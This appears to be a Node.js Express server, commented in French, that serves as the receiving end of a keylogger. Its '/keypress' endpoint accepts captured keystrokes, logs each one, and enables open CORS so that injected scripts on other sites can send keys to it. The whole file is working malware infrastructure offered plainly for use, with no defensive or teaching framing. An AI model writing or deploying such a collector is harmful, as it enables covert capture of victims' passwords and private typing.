const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
app.use(bodyParser.json());
app.use(cors()); // Permettra de gérer les requêtes cross-origin

// Créer un POST route pour la réception des données du keylogger
app.post('/keypress', (req, res) => {
    const { key } = req.body;

    console.log(`Reçu une pression de touche : ${key}`);

    // Ici vous pouvez traiter les données comme nécessaire.
    res.status(200).send({ message: 'Touche reçue' });
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});